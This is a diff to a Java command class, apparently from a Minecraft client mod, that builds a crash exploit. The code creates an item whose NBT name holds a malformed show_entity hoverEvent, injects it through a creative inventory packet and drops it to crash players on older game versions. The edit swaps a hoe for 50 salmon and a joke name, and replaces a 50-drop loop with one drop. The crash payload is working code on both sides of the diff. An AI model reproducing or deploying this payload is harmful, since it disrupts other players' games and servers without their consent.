@@ -17,7 +17,7 @@ import java.util.Objects;
 
 public class Poof extends Command {
     public Poof() {
-        super("Poof", "crash old versions", "poof");
+        super("Poof", "Crash players on older versions with sam the salmon", "poof");
     }
 
     public static void drop(int slot) {
@@ -34,15 +34,14 @@ public class Poof extends Command {
 
     @Override
     public void onExecute(String[] args) {
-        ItemStack crashme = new ItemStack(Items.IRON_HOE, 1);
+        // on the note of that why did you just make 50 drops instead of just dropping the item with count 50
+        ItemStack crashme = new ItemStack(Items.SALMON, 50);
         try {
-            crashme.setNbt(StringNbtReader.parse("{display:{Name:'{\"text\":\"fuck\",\"hoverEvent\":{\"action\":\"show_entity\",\"contents\":{\"id\":\"ez\",\"type\":\"minecraft:player\"}}}'}}"));
+            crashme.setNbt(StringNbtReader.parse("{display:{Name:'{\"text\":\"Sam the salmon\",\"hoverEvent\":{\"action\":\"show_entity\",\"contents\":{\"id\":\"AMONG US\",\"type\":\"minecraft:player\"}}}'}}"));
         } catch (CommandSyntaxException e) {
             e.printStackTrace();
         }
-        for (int i = 0; i < 50; i++) {
-            ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(9, crashme));
-            drop(9);
-        }
+        ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(9, crashme));
+        drop(9);
     }
 }
